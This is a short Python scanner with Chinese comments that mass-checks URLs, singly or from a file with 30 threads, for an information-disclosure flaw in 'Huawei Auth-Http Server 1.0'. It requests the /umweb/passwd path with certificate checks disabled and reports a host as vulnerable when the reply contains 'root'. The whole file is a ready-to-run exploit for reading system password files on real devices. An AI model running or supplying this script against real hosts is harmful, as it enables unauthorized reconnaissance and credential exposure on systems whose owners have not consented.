import requests, sys, argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
def main():
    parse = argparse.ArgumentParser(description="Huawei Auth-Http Server 1.0 信息泄露")
# 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help='Please input url')
    parse.add_argument('-f','--file',dest='file',type=str,help='Please input file')
# 实例化
    args = parse.parse_args()
    pool = Pool(30)
    try:
        if args.url:
            check(args.url)
        else:
            targets = []
            f = open(args.file,'r+')
            for target in f.readlines():
                target = target.strip()
                targets.append(target)
            pool.map(check,targets)
    except Exception as e:
        print(f"[ERROR] 参数错误请使用-h查看帮助信息{e}")
def check(target):
    target = f"{target}/umweb/passwd"
    headers = {
'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101Firefox/120.0',
'Accept':
'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
'Upgrade-Insecure-Requests': '1',
'Sec-Fetch-Dest': 'document',
'Sec-Fetch-Mode': 'navigate',
'Sec-Fetch-Site': 'none',
'Sec-Fetch-User': '?1',
'Te': 'trailers',
'Connection': 'close',
}
    response = requests.get(target, headers=headers, verify=False,timeout=3)
    try:
        if response.status_code == 200 and 'root' in response.text:
           print(f"[*] {target} Is Vulnerable")
        else:
           print(f"[!] {target} Not Vulnerable")
    except Exception as e:
        print(f"[Error] {target} TimeOut")


if __name__ == '__main__':
     main()